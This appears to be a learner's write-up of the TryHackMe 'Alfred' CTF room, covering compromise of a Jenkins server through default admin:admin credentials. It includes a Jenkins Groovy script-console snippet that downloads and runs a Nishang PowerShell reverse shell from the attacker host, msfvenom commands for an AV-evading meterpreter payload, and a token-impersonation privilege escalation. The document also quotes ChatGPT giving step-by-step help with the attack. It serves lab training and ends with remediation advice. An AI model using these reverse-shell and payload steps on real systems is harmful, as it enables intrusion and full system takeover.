# Alfred

# Table of Contents

- [Executive Summary](#Executive-Summary)
    
    Basic info about the box such as os system, tools used, skills bieng tested/ learned, level of difficulty. Synopsis of sorts about the box or whatever.
    
- [Information Gathering](#Information-Gathering)
    
    Intel gathering from everywhere (OSINT) & initial scan .what was found during initial scan? ( Cyclical)
    
- [Vulnerability Assessment](#Vulnerability-Assessment)
    
    (ENUMERATION) Dig deeper into what was found during information gathering to gather Intel, dig deeper into the protocols, ports, services, systems, service versions, ect. find known exploits, cve’s, any and all potential vulnerabilites and exploitation vectors. make a list of things to “to try”.(cyclical)
    
- [Exploitation](#Exploitation)
    
    Here we take what we found from previous 2 steps and attempt to gain access to target, or to escalate priv if we are in post-exploitation phase. Start with low hanging fruit or obvious misconfigs from “to try” list. Also note what worked and why, but also what didn't work and why.
    
- [Post Exploitation](#Post-Exploitation)
    
    Includes priv esc, data exfil, pillaging, Info gathering, vuln assessment,(will be repeated here cyclically as needed) & persistence.
    
- [Lateral Movement](#Lateral-Movement)
    
    Test what we can do once inside, compromise the entire system, includes pivoting, evasive testing, info gathering, vuln assessment, (priv) exploitation, post-expliotation.
    
- [Proof-of-Concept](#Proof-of_Concept)
    
    prove the vulnerabilities found, flags gathered ( root.txt, user.txt,flag.txt)
    
- [Post-Engagement](#Post-Engagement)
    
    include cleanup, documentation & reporting, report review meeting, deliverable acceptance, post-remediation testing, data retention, close out. Also put what I learned, how I solved the box, difficulties I ran into and how I solved them. Maybe even links to write ups I used to help me or just to reference for later. Look into the why - why do these things happen? why do these misconfigurations occur? What was the takeaway, what is the why behind these specific vulnerabilities, dive deep - what was the point/ message the machine author was trying to say? did I go the intended route? Think deep and dive deep to gain maximum understanding. good spot to link outside sources.
    


# Engagement:

- # Executive Summary
    
    In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it). check out more about Jenkins here: [https://www.jenkins.io/](https://www.jenkins.io/) . After which, we'll use an interesting privilege escalation method to get full system access.
    
    Since this is a Windows application, we'll be using [Nishang](https://github.com/samratashok/nishang) to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the [reverse shell scripts](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).
    
    Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
    
    So we are gonna get our hands dirty with some Windows. Looks like I'll need to jump into Jenkins and Nishang at a later date to get more details.
    
    Using the attackbox on THM because I dont wanna wait to power up my Kali Linux rn and connect via vpn, this computer running a little slow already atm.
    
- # Information Gathering
    
    ## Inititial NMAP SCAN:
    
    Command run: 
    
     nmap -p- -sV -sC --open 10.10.42.169 
    
    What it does: scans all ports (-p-) service version (-sV) simple scripts (-sC), only check open ports & skips open filtered and closed results(—open). you can also press enter during the scan to get a status update!
    
    ok nvm that, I cancelled cause it was taking too long. gonna run this one, my usual:
    
    Command Run:
    
     nmap -A -vv -T4 10.10.42.169
    
    Results:
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image.png)
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%201.png)
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%202.png)
    
- # Vulnerability Assessment
    
    ## Ports, Services, & Versions:
    
    ## 80 TCP HTTP Microsoft IIS https 7.5
    
    Microsoft IIS 7.5 lets use the TRACE method, see what happens? I also want to see if anything pops up on searchsploit or exploit DB for this version. Also has a webpage, seems like go and dir may be in order. 
    
    Webpage:
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%203.png)
    
    Username is probably Alfred or Bruce or Wayne? We have the domain name as well, we may be able to use this info for a hydra brute force or password spraying attack during exploitation, we shall see. checked the source code of the page, not much there but the image url, may get super desparate later on and download and steg it out but hopefully not.
    
    Exploit DB results:
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%204.png)
    
    Heres the potential exploit from the database: 
    
    Title: Microsoft IIS 7.5 Classic ASP Authentication Bypass
    
    Affected Software:
    Microsoft IIS 7.5 with configured Classic ASP and .NET Framework 4.0
    installed (.NET Framework 2.0 is unaffected, other .NET frameworks
    have not been tested)
    (tested on Windows 7)
    
    Details:
    By appending ":$i30:$INDEX_ALLOCATION" to the directory serving the
    classic ASP file access restrictions can be successfully bypassed.
    
    Take this Example:
    1.) Microsoft IIS 7.5 has Classic ASP configured (it allows serving .asp files)
    2.) There is a password protected directory configured that has
    administrative asp scripts inside
    3.) An attacker requests the directory with :$i30:$INDEX_ALLOCATION
    appended to the directory name
    4.) IIS/7.5 gracefully executes the ASP script without asking for
    proper credentials
    
    ---
    
    Title: Microsoft IIS 7.5 .NET source code disclosure and authentication bypass
    
    Affected Software:
    Microsoft IIS/7.5 with PHP installed in a special configuration
    (Tested with .NET 2.0 and .NET 4.0)
    (tested on Windows 7)
    The special configuration requires the "Path Type" of PHP to be set to
    "Unspecified" in the Handler Mappings of IIS/7.5
    
    Details:
    The authentication bypass is the same as the previous vulnerabilities:
    Requesting for example
    http://<victimIIS75>/admin:$i30:$INDEX_ALLOCATION/admin.php will run
    the PHP script without asking for proper credentials.
    
    By appending /.php to an ASPX file (or any other file using the .NET
    framework that is not blocked through the request filtering rules,
    like misconfigured: .CS,.VB files)
    IIS/7.5 responds with the full source code of the file and executes it
    as PHP code. This means that by using an upload feature it might be
    possible (under special circumstances) to execute arbitrary PHP code.
    Example: Default.aspx/.php
    
    Cheerio and signed,
    
    /Kingcope
    
    go and dir with some common txt files only revealed index.html which is the main page, also checked for vhosts and dns to no avail. I’ve tried Nikto and ffuf but neither gave much. kind of odd I cant find any directories.
    
    ## Enumeration with Nishang:
    
    I browsed through the repository and cloned it to the attack box, but I did not find anything particularly useful for enumeration. Most of the scripts are for after initial acces has been achieved.
    
    ## 8080 TCP HTTP Jetty 9.4.z-SNAPSHOT
    
    since this is a login page I think I could try hydra to brute force.This is the login for Jenkins. I'm also gonna check into the Nishang repository and grab one of the reverse shell scripts as per the room instructions. Another username could be admin? 
    
    here's the webpage for this one: 
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%205.png)
    
    Found this on Exploit DB for Jetty 9.4 with various versions, not an exact match:
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%206.png)
    
    Here's what is on exploit DB: 
    
     Exploit Title: Jetty 9.4.37.v20210219 - Information Disclosure
    
     Date: 2021-10-21
    
     Exploit Author: Mayank Deshmukh
    
     Vendor Homepage: https://www.eclipse.org/jetty/
    
     Software Link: https://repo1.maven.org/maven2/org/eclipse/jetty/jetty-distribution/9.4.37.v20210219/
    
     Version: 9.4.37.v20210219 and 9.4.38.v20210224
    
     Tested on: Kali Linux
    
     CVE : CVE-2021-28164
    
    POC #1 - web.xml
    
    GET /%2e/WEB-INF/web.xml HTTP/1.1
    
    Host: localhost:8080
    
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    
    Accept-Language: en-US,en;q=0.5
    
    Accept-Encoding: gzip, deflate
    
    Connection: close
    
    Upgrade-Insecure-Requests: 1
    
    Cache-Control: max-age=0
    
    Nothing from Exploit DB seems too promising. At least at my current level of ability. Tried Nikto and ffuf on this as well with zero results. I may be an idiot doing it wrong but idk. Nishang doesnt offer much either but post exploitation scripts.
    
    ## 3389 TCP tcpwrapped (RDP port)
    
    I think this could be useful in using one of the scripts from Nishang. we shall see. Also, ran a few nmap scripts to gather more details of the port but really nothing of note. I've looked through the Nishang repository but most of those scripts are for post exploitation.
    
    ### To Try:
    
    brute force attempts with hydra with username Alfred or Bruce or Wayne, or Admin?
    
    use Nishang repository to find reverse shell scripts, or brute force scripts? idk theres a ton of stuff on there.
    
    Attempt to use the exploits found on exploit db for both IIS 7.5 on port 80 and Jetty 9.4 on 8080.
    
    Also gonna pop open Metasploit to see whatsup, maybe it has some modules ready to go for me to attempt.
    
- # Exploitation
    
    ## Things I Tried:
    
    - Brute Forcing w/ Hydra:
    
    I attempted to use hydra with the usernames Alfred, Bruce, Wayne and Admin but all the results came back with clearly incorrect information. Idk if I was using incorrect parameters of just plainly don't know how to use Hyrda correctly, but all I got was nonsense. heres a screenshot and the commands I utilized. 
    
    Note to self: Its important to use hydra with the correct login failure message otherwise it can give false positives. 
    
    command run: 
    
    hydra -l Alfred -P /usr/share/wordlists/rockyou.txt 10.10.9.157 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%207.png)
    
    Note to self: get better at using Hydra u fool!
    
    - Next thing I did was dive into Nishang to see what I could utlize for initial access. But that ended up bieng a dead end as far as I could tell due to everything bieng for post exploitation.

    - I attempted to use the exploit from Exploit DB using curl on IIS 7.5 on port 80 which was an authentication bypass but it didn't work. I feel like there's a way to get this exploit to work but I'm not smart enough yet to do it. Will maybe try it again in the future.

    - The exploit from exploit DB which was an information disclosure for the various Jetty 9.4 versions to access a sensitive document called web.xml was also unsuccessful using curl. Again with the above I may try it in the future when my brain grows larger.

    - I scoured google to attempt to gain a better understanding of how either of these services could be exploited. found another GitHub repository on exploiting IIS right here: [https://github.com/reewardius/iis-pentest/blob/main/README.md](https://github.com/reewardius/iis-pentest/blob/main/README.md)
    
    Nothing came of that. 
    
    - I next popped open Metasploit and looked up both IIS 7.5 and Jetty. I found some potential exploits that did not match my versions when I ran them and thus were also a dead end.
    - Talked with my only friend ChatGPT about why nothing was working… then it mentioned something:
    
    ### ChatGPT Said:
    
    **Default or Weak Credentials**: Jenkins installations sometimes come with default or weak credentials. If you can brute force or guess the credentials, you might gain access. Common default credentials include `admin:admin` or `jenkins:jenkins`.
    
    Well then, guess what FINALLY worked!? admin:admin. I wonder why Hydra didnt pick that up. 
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%208.png)
    
    Now that I have access to interacting with the target , it is time to return to the enumeration stage!
    
- # Post Exploitation
    
    Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: *powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port*
    
    You first need to download the Powershell script and make it available for the server to download. You can do this by creating an http server with python: *python3 -m http.server*
    
    According to the room instuctions, im suppose to look for something so I can execute commands on the underlying system, so lets look around.
    
    ### Internal Enumeration:
    
    Ok so after poking around a bit on the management console I managed to find a script console that allows me to interact with the underlying system. It’s written in groovy https://groovy-lang.org/ which is a language for interacting with a java platform.
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%209.png)
    
    Going to figure out a way to get one of those nishang reverse shell scripts onto the system and catch it with nc, socat or multi/handler. good thing I have my assistant ChatGPT to give me step by step:
    
    ### **1. Download and Host the PowerShell Script**
    
    - Grab the powershell script they link in the room from Nishang  (`Invoke-PowerShellTcp.ps1`) and save to a local file. Also use chmod +x to make it executable.
    
    **Start a Python HTTP Server:**
    
    - Open a terminal and navigate to the directory or specify the path where the PowerShell script is saved.
    - Run the following command to start an HTTP server that will serve the PowerShell script:
    
    python3 -m http.server 8000
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2010.png)
    
    - This will start an HTTP server on port 8000 (you can choose a different port if needed). The server will serve files from the current directory.
    
    ### **2. Start a Netcat Listener:**
    
    - Run a Netcat listener on the port you specified (e.g., `4444`): Just dont be an idiot like me and make sure you listen on the correct port otherwise you wont get a connection.
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2011.png)
    
    ### **3. Upload & run the script on the Jenkins Server**
    
    1. **Find the Script Console by navigating to Manage Jenkins** > **Script Console**.
    2. **Execute a Command to Download and Run the Script:**
        - In the script console, you can use Groovy code to download and execute the PowerShell script they give you in the room (note: simply copying and pasting the script into the console will not work, since its not in groovy). Replace `your-ip` and `your-port` with your local IP address and the port on which your HTTP server is running (e.g., `8000`) and the secondary port field where netcat is listening (e.g., 4444).
        
        Here’s a Groovy script that you can run in the Jenkins Script Console:
        
        ```groovy
        groovy
        Copy code
        def scriptUrl = "http://your-ip:8080/Invoke-PowerShellTcp.ps1"
        def command = "powershell iex (New-Object Net.WebClient).DownloadString('${scriptUrl}'); Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port"
        def process = command.execute()
        process.waitFor()
        ```
        
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2012.png)
    
    - This will listen for incoming connections on port `4444`.
    
    ### **4. Execute the Command on Jenkins**
    
    - Press the run button and if Jenkins executes the command successfully ( the request should hang for a moment), it will connect back to your local machine, and you should receive a reverse shell on your Netcat listener.
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2013.png)
    
    NOW ON TO LATERAL MOVEMENT!!!!
    
- # Lateral Movement
    
    ## Switching to Meterpreter:
    
    Now that we’ve achieved initial access, lets follow the room instructions and switch to a meterpreter shell for the privesc process. I’m sure this isn't needed but for the sake of learning I will oblige.They do a good job of explaining the process below:
    
    To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.
    
    Use msfvenom to create a Windows meterpreter reverse shell using the following payload:
    
    **`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe`**
    
    Make sure to use your attacker port and IP, here's my command: 
    
    msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.48.67 LPORT=2222 -f exe -o reverse.exe
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2014.png)
    
    This payload generates an encoded x86-64 reverse TCP meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.
    
    After creating this payload, download it to the machine using the same method in the previous step:
    
    **`powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"`**
    
    Ok. SO a word about this: getting this simple payload onto the target was for me way more difficult and cumbersome than it should have been. I simply tried to download it from the command line on the target, but every time the http request would go through, then hang and nothing would download, which caused me to have to exit the shell and redo the initial exploit to get back on.
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2015.png)
    
     
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2016.png)
    
    I finally had enough frustration and decided to put the above payload in groovy format and execute it on the script console like earlier in order to get it onto the target machine. Heres the payload in groovy:
    
    def cmd = 'powershell -Command "(New-Object System.Net.WebClient).DownloadFile(\'[http://10.10.154.193:8000/reverse.exe\\](http://10.10.154.193:8000/reverse.exe%5C%5C)', \'C:\\Users\\bruce\\reverse.exe\')"'
    def proc = cmd.execute()
    proc.waitFor()
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2017.png)
    
    IDK maybe im missing something but this was the only way I got it to work. ANYWAYS.
    
    Before running this program, ensure the handler is set up in Metasploit:
    
    **`use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run`**
    
    This step uses the Metasploit handler to receive the incoming connection from your reverse shell. Once this is running, enter this command to start the reverse shell
    
    **`Start-Process "shell-name.exe"`**
    
    This should spawn a meterpreter shell for you!
    
    For the above step I simply ran .\reverse.exe from the command line of the target machine and recieved my meterpreter shell:
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2018.png)
    
    ## PrivEsc:
    
    OK FINALLY lets move on to privesc. The room provides really good step by step instructions (don't forget to run the command ‘shell’ to drop into a system shell): 
    
    Now that we have initial access, let's use token impersonation to gain system access.
    
    Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).
    
    This access token consists of:
    
    - User SIDs(security identifier)
    - Group SIDs
    - Privileges
    
    Amongst other things. More detailed information can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).
    
    There are two types of access tokens:
    
    - Primary access tokens: those associated with a user account that are generated on log on
    - Impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process
    
    For an impersonation token, there are different levels:
    
    - SecurityAnonymous: current user/client cannot impersonate another user/client
    - SecurityIdentification: current user/client can get the identity and privileges of a client but cannot impersonate the client
    - SecurityImpersonation: current user/client can impersonate the client's security context on the local system
    - SecurityDelegation: current user/client can impersonate the client's security context on a remote system
    
    Where the security context is a data structure that contains users' relevant security information.
    
    The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:
    
    - SeImpersonatePrivilege
    - SeAssignPrimaryPrivilege
    - SeTcbPrivilege
    - SeBackupPrivilege
    - SeRestorePrivilege
    - SeCreateTokenPrivilege
    - SeLoadDriverPrivilege
    - SeTakeOwnershipPrivilege
    - SeDebugPrivilege
    
    There's more reading [here](https://www.exploit-db.com/papers/42556).
    
    cool, so heres a look at all the listed privs of the user: 
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2019.png)
    
    You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability.
    
    Enter: *load incognito* to load the incognito module in Metasploit. Please note that you may need to use the *use incognito* command if the previous command doesn't work. Also, ensure that your Metasploit is up to date.
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2020.png)
    
    To check which tokens are available, enter the *list_tokens -g*. We can see that the *BUILTIN\Administrators* token is available.
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2021.png)
    
    Use the *impersonate_token "BUILTIN\Administrators"* command to impersonate the Administrators' token. What is the output when you run the *getuid* command?
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2022.png)
    
    Even though you have a higher privileged token, you may not have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do).
    
    Ensure that you migrate to a process with correct permissions (the above question's answer). The safest process to pick is the services.exe process. First, use the *ps* command to view processes and find the PID of the services.exe process. 
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2023.png)
    
    Migrate to this process using the command *migrate PID-OF-PROCESS*
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2024.png)
    
    Read the root.txt file located at C:\Windows\System32\config
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2025.png)
    
    Note to self: use Linux commands in meterpreter I guess? IDK need to use it more often.
    
    OK well I guess that does it! finally got System, now time for PoC and of course Post-Engagement.
    
- # Proof-of-Concept
    
    ok here's some proof:
    
    Users flag on bruce’s desktop:
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2026.png)
    
    And of course root.txt flag in config:
    
    ![image.png](Alfred%20606c6118a0a04d0cb4898357e6ef4740/image%2027.png)
    
- # Post-Engagement
    
    ## Difficulties:
    
    I had a hard time with initial access because of my inability to use hydra effectively. Another reason was due to my reluctance to attempt default creds or look slightly deeper into  how Jenkins servers work.
    
    Another difficulty was during the lateral movement stage, which wasn't really a true lateral move but just switching to a more stable shell on meterpreter. I don't know why the Powershell command wouldnt complete the download when I executed it on the command line of the target. the shell itself was very unstable and I kept having to redo the exploit and start a new shell any time I entered something incorrectly on the command line… which happened a lot.
    
    Another small difficulty I had was with entering comands on meterpreter. 
    
    ## New topics/ technologies learned:
    
    Jenkins server is interesting to me and I should probably dive in at a future date to learn more about it.
    
    IIS is something else I know of but could use a deep dive into.
    
    of course bieng aware of groovy and at least understanding it better would be cool.
    
    ## TTTP’s to brush up on
    
    (tactics, techniques, technologies, procedures)
    
    brush upon:
    
    Hydra syntax
    
    meterpreter syntax
    
    troubleshooting or figuring out why some shells act a fool
    
    tokens in Windows for privesc
    
    become more familiar with Nishang?
    
    Also become more familiar with ffuf & Nikto
    
    ## Key take away for future engagements
    
    Considerations?: I wanna try and see if I can get those exploits from exploit DB to work. Kind of interested in seeing if there's a way to get into the outward facing IIS 7.5 server that was on port 80. I also want to look more into the Jetty exploit as well. Also wouldnt be a bad idea to see what I could of done with the RDP port.
    
    ## Why was this vulnerable?:
    
    Change the default creds when u set something up!!! 
    
    Also be very aware of the token permissions in your windows environment!! 
    
    Heres ChatGPT explaining the privEsc portion better than me: 
    
    ### Vulnerabilities Exploited:
    
    1. **Token Impersonation:**
        - **SeImpersonatePrivilege** and **SeDebugPrivilege** allow for token impersonation, enabling the current user to impersonate higher-privileged accounts like **Administrators**.
        - By using these tokens, attackers can escalate privileges and gain unauthorized access to sensitive system resources.
    2. **Metasploit's incognito module**:
        - This tool exploits token impersonation vulnerabilities, allowing an attacker to list and impersonate tokens of other users, such as system administrators.
    
    ### Privileges Abused:
    
    - **SeImpersonatePrivilege**: Allows impersonation of another user's token.
    - **SeDebugPrivilege**: Grants the ability to debug any process, including those owned by the SYSTEM account.
    
    ### Remediation Steps:
    
    1. **Limit Privileges**:
        
        Restrict **SeImpersonatePrivilege** and **SeDebugPrivilege** to only necessary accounts via **Local Security Policy** (`secpol.msc`).
        
    2. **Use Least Privilege**:
        
        Ensure users and services have the minimum required privileges, avoiding unnecessary high-level access.
        
    3. **Audit Token Usage**:
        
        Regularly review accounts with impersonation privileges and enable logging for privilege use with `auditpol`.
        
    4. **Patch Management**:
        
        Keep systems updated to address vulnerabilities like token manipulation.